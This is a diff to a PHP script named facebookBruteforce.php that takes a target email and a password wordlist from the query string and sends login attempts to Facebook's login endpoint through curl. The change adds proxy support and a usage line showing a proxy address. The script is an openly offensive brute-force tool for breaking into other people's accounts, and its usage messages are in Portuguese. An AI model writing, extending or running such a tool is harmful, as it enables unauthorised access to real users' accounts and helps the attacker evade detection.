@@ -1,10 +1,11 @@
 <?php 
-$proxy = '';
+$proxy = isset($_GET['proxy'])? $_GET['proxy'] : '' ;
 $email =isset($_GET['email'])? $_GET['email'] : '' ;
 $wordlist = isset($_GET['words'])? $_GET['words'] : 'pass.txt';
 echo '[+] Uso: facebookBruteforce.php?email=email@email.com<br/>';
 echo '[+] Uso: senhas no arquivo pass.txt ou no $_GET words:<br/>';
 echo '[+][+][+] facebookBruteforce.php?email=email@email.com&words=wordlist.txt<br/>';
+echo '[+][+][+] facebookBruteforce.php?email=email@email.com&words=wordlist.txt&proxy=127.0.0.1:65103<br/>';
 function brute($usuario, $senha,$proxy){
       $ch = curl_init();
       curl_setopt($ch, CURLOPT_URL, "https://login.facebook.com/login.php?m&next=http://m.facebook.com/home.php");
